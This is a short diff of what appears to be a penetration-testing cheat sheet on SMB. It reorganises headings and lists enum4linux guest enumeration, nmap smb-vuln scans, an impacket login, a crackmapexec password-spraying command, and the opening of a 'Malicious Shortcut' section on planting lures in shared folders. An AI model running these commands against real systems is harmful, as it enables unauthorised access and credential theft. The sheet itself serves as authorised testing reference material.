@@ -1,4 +1,5 @@
-#### No Creds
+
+### Enumeration
 ```
 enum4linux -a <ip>
 enum4linux -a -u "guest" -p " " <ip>
@@ -14,15 +15,14 @@ crackmapexec smb <ip> -u "guest" -p ""
 nmap -T4 -p445 --script smb-vuln* <ip>
 ```
 
-#### Got Creds
 ```
 impacket-smbclient '<domain>/<user>:<password>@<ip>'
 
 crackmapexec smb <target_ips> -u <user_list> -p <pass_list> -d <domain> --continue-on-success --shares
 ```
 
+### Exploitation
 #### Malicious Shortcut
-
 ```
 If you have the ability to write to a windows share that is being used by other people. 
 
